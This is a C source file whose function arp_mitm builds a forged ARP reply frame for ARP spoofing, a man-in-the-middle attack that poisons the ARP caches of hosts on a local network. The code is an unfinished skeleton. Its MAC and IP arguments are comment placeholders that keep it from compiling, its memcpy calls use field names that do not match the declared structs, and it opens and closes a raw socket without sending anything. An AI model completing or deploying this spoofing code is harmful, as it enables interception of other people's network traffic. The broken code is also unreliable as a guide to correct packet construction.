#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#pragma pack(push, 1)
typedef struct ethernet_header {
    uint8_t  dest_mac_addr[6];
    uint8_t  src_mac_addr[6];
    uint16_t ethernet_type;
} ethernet_header_t;

typedef struct arp_payload {
    uint16_t hardware_type;
    uint16_t protocol_type;
    uint8_t  hardware_address_length;
    uint8_t  protocol_address_length;
    uint16_t operation_code;
    uint8_t  sender_hardware_address[6];
    uint8_t  sender_protocol_address[4];
    uint8_t  target_hardware_address[6];
    uint8_t  target_protocol_address[4];
} arp_payload_t;

typedef struct arp_frame {
    ethernet_header_t ethernet;
    arp_payload_t     arp;
} arp_frame_t;
#pragma pack(pop)

void arp_mitm(void)
{
    uint8_t buffer[1500];

    arp_frame_t* arp_frame = (arp_frame_t*)buffer;

    memset(buffer, 0, sizeof(buffer));

    memcpy(arp_frame->ethernet.dest_mac_address, /* DEST MAC */, 6);
    memcpy(arp_frame->ethernet.src_mac_address, /* SRC MAC */, 6);
    arp_frame->ethernet.ethernet_type = htons(0x0806);

    arp_frame->arp.hardware_type           = htons(0x0001);
    arp_frame->arp.protocol_type           = htons(0x0800);
    arp_frame->arp.hardware_address_length = 6;
    arp_frame->arp.protocol_address_length = 4;
    arp_frame->arp.operation_code          = htons(2);
    memcpy(arp_frame->arp.sender_hardware_address, /* SHA */, 6);
    memcpy(arp_frame->arp.sender_protocol_address, /* SPA */, 4);
    memcpy(arp_frame->arp.target_hardware_address, /* THA */, 6);
    memcpy(arp_frame->arp.target_protocol_address, /* TPA */, 4);

    int raw_socketfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (raw_socketfd < 0) {
        printf("[-] Error creating the socket.\n");
        return;
    }
    printf("[+] Socket created successfully.\n");

    close(raw_socketfd);
    printf("[+] Socket closed successfully.\n");
}
